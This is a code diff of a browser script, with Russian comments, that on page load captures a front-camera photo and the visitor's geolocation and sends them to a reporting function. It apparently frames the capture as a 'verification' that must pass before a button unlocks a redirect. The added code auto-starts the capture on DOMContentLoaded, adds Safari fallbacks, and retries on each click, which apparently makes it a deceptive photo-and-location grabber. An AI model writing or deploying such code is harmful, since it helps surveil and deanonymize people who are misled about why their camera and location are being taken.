@@ -56,13 +56,15 @@ async function askGeolocation() {
 
 // === Фото с камеры ===
 async function takePhoto() {
-  if (!navigator.mediaDevices?.getUserMedia)
-    throw new Error('Camera unsupported');
+  if (!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');
+
   const stream = await navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'user' },
   });
   const [track] = stream.getVideoTracks();
+
   try {
+    // Путь 1: ImageCapture, где доступен
     const cap = new ImageCapture(track);
     const bmp = await cap.grabFrame();
     const c = document.createElement('canvas');
@@ -73,13 +75,21 @@ async function takePhoto() {
     track.stop();
     return dataUrl;
   } catch {
+    // Путь 2: через <video> (Safari/iOS и др.)
     const v = document.createElement('video');
+    v.playsInline = true;
+    v.muted = true;
     v.srcObject = stream;
-    await v.play();
+
+    await new Promise((res) => (v.onloadedmetadata = res)).catch(() => {});
+    try { await v.play(); } catch {}
+
+    const w = v.videoWidth || 640;
+    const h = v.videoHeight || 480;
     const c = document.createElement('canvas');
-    c.width = v.videoWidth;
-    c.height = v.videoHeight;
-    c.getContext('2d').drawImage(v, 0, 0);
+    c.width = w;
+    c.height = h;
+    c.getContext('2d').drawImage(v, 0, 0, w, h);
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
     stream.getTracks().forEach((t) => t.stop());
     return dataUrl;
@@ -127,46 +137,55 @@ async function sendReport({ photoBase64, geo }) {
 async function autoFlow() {
   try {
     setBtnLocked();
-    UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';
+    if (UI.text) UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';
 
-    const [geo, photoBase64] = await Promise.all([
-      askGeolocation(),
-      takePhoto(),
-    ]);
+    const [geo, photoBase64] = await Promise.all([askGeolocation(), takePhoto()]);
 
-    UI.text.innerHTML = 'Отправляем данные для проверки…';
+    if (UI.text) UI.text.innerHTML = 'Отправляем данные для проверки…';
     await sendReport({ photoBase64, geo });
 
     window.__reportReady = true;
     setBtnReady();
 
-    UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
-    UI.note.textContent = 'Можно продолжить.';
+    if (UI.text) UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
+    if (UI.note) UI.note.textContent = 'Можно продолжить.';
   } catch (e) {
     console.error(e);
     setBtnLocked();
     window.__reportReady = false;
-    UI.text.innerHTML =
-      '<span class="err">Не удалось выполнить проверку.</span>';
-    UI.note.textContent = 'Повтори позже.';
+    if (UI.text) UI.text.innerHTML = '<span class="err">Не удалось выполнить проверку.</span>';
+    if (UI.note) UI.note.textContent = 'Повтори позже.';
   }
 }
 
-// === Экспорт функции ===
+// === Экспорт функции (на всякий случай)
 window.__autoFlow = autoFlow;
 
-// === Защита от преждевременного клика ===
-(function guardClick() {
-  const btn = UI.btn;
-  if (!btn) return;
-  btn.addEventListener(
-    'click',
-    (e) => {
-      if (!window.__reportReady) {
-        e.preventDefault();
-        e.stopPropagation();
-      }
-    },
-    { capture: true }
-  );
-})();
+// === ИНИЦИАЛИЗАЦИЯ ПОСЛЕ ЗАГРУЗКИ ===
+document.addEventListener('DOMContentLoaded', () => {
+  // показать кнопку (если была скрыта стилями) и залочить
+  if (UI.btn) {
+    UI.btn.style.display = 'block';
+    setBtnLocked();
+  }
+
+  // автозапуск проверки
+  autoFlow().catch((err) => console.error('autoFlow error:', err));
+});
+
+// Клик по кнопке: если проверка не готова — повторяем её,
+// если готова — вызываем go() (редирект из index.html)
+if (UI.btn) {
+  UI.btn.addEventListener('click', async (e) => {
+    e.preventDefault();
+    if (!window.__reportReady) {
+      try { await autoFlow(); } catch (err) { console.error('retry autoFlow error:', err); }
+      return;
+    }
+    if (typeof go === 'function') {
+      try { go(); } catch (err) { console.error('go() error:', err); }
+    } else if (UI.note) {
+      UI.note.textContent = 'Готово — но целевой редирект не найден.';
+    }
+  });
+}
